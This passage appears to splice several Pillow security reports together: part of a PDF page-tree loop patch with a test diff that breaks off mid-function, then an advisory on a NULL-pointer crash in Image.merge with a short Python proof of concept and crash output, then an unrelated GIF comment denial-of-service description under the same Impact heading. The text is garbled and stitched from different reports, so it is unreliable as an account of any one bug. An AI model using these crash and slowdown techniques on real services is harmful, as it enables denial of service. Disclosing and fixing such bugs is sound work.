CPU vs a true infinite loop). It needs a separate hunk: the patches attached here only guard the `/Parent` walk and leave the `/Kids` reproducer hanging in `linearize_page_tree()`, and the `/Kids` guard conversely leaves this reproducer spinning in `rewrite_pages()` — verified by cross-applying each patch. Applied together (the `/Kids` guard plus attached patch 2), both reproducers are rejected with `PdfFormatError: page tree loop found` and `Tests/test_pdfparser.py` + `Tests/test_file_pdf.py` pass (30 tests). ## The patch (1 of 2) Track visited page-tree nodes in PdfParser.rewrite_pages() so a cyclic /Parent chain cannot loop forever when appending to a PDF Applies to `src/PIL/PdfParser.py` at the commit above. ```diff diff --git a/Tests/test_pdfparser.py b/Tests/test_pdfparser.py index f2ae6b11f..f841aca14 100644 --- a/Tests/test_pdfparser.py +++ b/Tests/test_pdfparser.py @@ -169,3 +169,28 @@ def test_duplicate_xref_entry() -> None: def test_trailer_loop() -> None: with pytest.raises(PdfFormatError, match="trailer loop found"): PdfParser("Tests/images/trailer_loop.pdf") + + +@pytest.mark.timeout(5) +def test_page_tree_parent_loop() -> None: + # title: Pillow: NULL pointer dereference in Image.merge via an unvalidated band 0
desc:
### Summary
`Image.merge()` checks the mode of every input band except band 0. If band 0 is a single-band `I` or `F` image, the native merge routine reads a pixel pointer that is NULL for those modes and the process crashes. The IPTC plugin reaches this from a plain `Image.open()` followed by a load, and IPTC has no magic-byte prefilter, so a crafted file with no recognizable header can drive it.

### Details
The validation loop skips band 0:

- `src/PIL/Image.py:3795` iterates `for band in bands[1:]` and checks mode and size only for those.

For an `I` or `F` image the 8-bit plane `image8` is NULL (only `image32` is set). `ImagingMerge` dereferences `bands[0]->image8[y]` for the multi-band output modes:

- `src/libImaging/Bands.c:302`, `:311`, `:321`

The IPTC loader builds the band list from an attacker-typed sub-image and passes it to merge with the sub-image at index 0:

- `src/PIL/IptcImagePlugin.py:156-160`
- `src/PIL/IptcImagePlugin.py:169` registers the opener with no accept function.

### PoC
```python
from PIL import Image

# Band 0 is a single-band "I" image: its image8 plane is NULL. merge() validates only
# bands[1:], so the native ImagingMerge dereferences the NULL plane for band 0.
band0 = Image.new("I", (4, 4))
Image.merge("RGB", [band0, Image.new("L", (4, 4)), Image.new("L", (4, 4))])
```

Run it:
```
$ python 02_poc.py
Segmentation fault (core dumped)
```

Observed on a source build of commit `3e2ab96`.

Under AddressSanitizer:
```
==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
    #0 ImagingMerge   src/libImaging/Bands.c:311
    #1 _merge         src/_imaging.c:2492
SUMMARY: AddressSanitizer: SEGV src/libImaging/Bands.c:311 in ImagingMerge
```
The null address confirms the dereference of the missing `image8` plane for band 0.

### Impact
NULL pointer dereference in a C extension. A crafted file opened and loaded through the IPTC path crashes the worker process. This is a hard crash, not a Python exception an application can catch.

A 2 MB file takes about 5 seconds to open, a 4 MB file about 35 seconds, and an 8 MB file about 3 minutes. An ordinary GIF of the same size opens in well under a second. The cost is paid inside `Image.open()` itself, with default settings, before the application has seen the image's size or format. The bug is in `GifImageFile._seek()` in `src/PIL/GifImagePlugin.py`, which builds `info["comment"]` by appending to an immutable `bytes` object with no size limit. It appends once per 255-byte sub-block (`comment += block`, line 261) and once per comment extension (`info["comment"] += b"\n" + comment`, line 266). Each append copies everything collected so far. A file made of many tiny comment extensions forces a full re-copy for each one. Because `_open()` ends with `self._seek(0)`, any code that only opens an uploaded file to identify it, read its dimensions, or make a thumbnail pays the full cost. The decompression-bomb check does not help, since the image is 1×1. Memory use stays linear, so the effect is processor exhaustion and latency, bounded by whatever upload size the service allows (about 1 second at 1 MB).
